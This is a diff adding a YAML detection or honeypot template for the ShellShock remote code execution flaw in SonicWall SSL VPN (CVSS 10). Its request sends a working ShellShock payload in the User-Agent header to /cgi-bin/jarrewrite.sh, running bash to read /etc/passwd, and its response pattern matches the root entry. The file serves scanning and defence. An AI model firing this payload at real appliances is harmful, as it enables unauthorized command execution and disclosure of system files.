@@ -1,0 +1,31 @@
+id: sonicwall-sslvpn-shellshock
+info:
+  name: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
+  author: PR3R00T
+  description: 'Sonicwall SSLVPN contains a ''ShellShock'' vulnerability which allows
+    remote unauthenticated attackers to execute arbitrary commands.
+
+    '
+  severity: critical
+  reference:
+  - https://twitter.com/chybeta/status/1353974652540882944
+  - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: shellshock,sonicwall,rce,vpn
+traps:
+- request:
+    method: GET
+    path: /cgi-bin/jarrewrite.sh
+    headers:
+      User-Agent: '"() { :; }; echo ; /bin/bash -c ''cat /etc/passwd''"'
+      Accept: '*/*'
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
